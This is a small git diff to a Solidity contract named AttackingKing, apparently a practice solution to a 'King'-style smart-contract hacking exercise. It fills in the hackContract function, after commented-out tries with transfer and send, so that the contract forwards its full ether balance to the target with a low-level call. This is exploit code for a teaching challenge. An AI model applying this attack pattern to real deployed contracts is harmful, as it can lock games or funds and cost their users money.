@@ -4,7 +4,7 @@ import "./King.sol";
 import "hardhat/console.sol";
 
 contract AttackingKing {
-    address public contractAddress;
+    address public  contractAddress;
  
 
     constructor(address _contractAddress) payable {
@@ -13,6 +13,12 @@ contract AttackingKing {
 
     function hackContract() external payable {
         // Code me!
+
+        // payable(contractAddress).transfer(address(this).balance);
+        // address payable _to = payable(contractAddress);
+        // bool sent = _to.send(address(this).balance);
+        // // require(sent, "Failed to send Ether");
+
         (bool sent,) =  payable(contractAddress).call{value: address(this).balance}("");
         require(sent, "Failed to send the funds");
     }
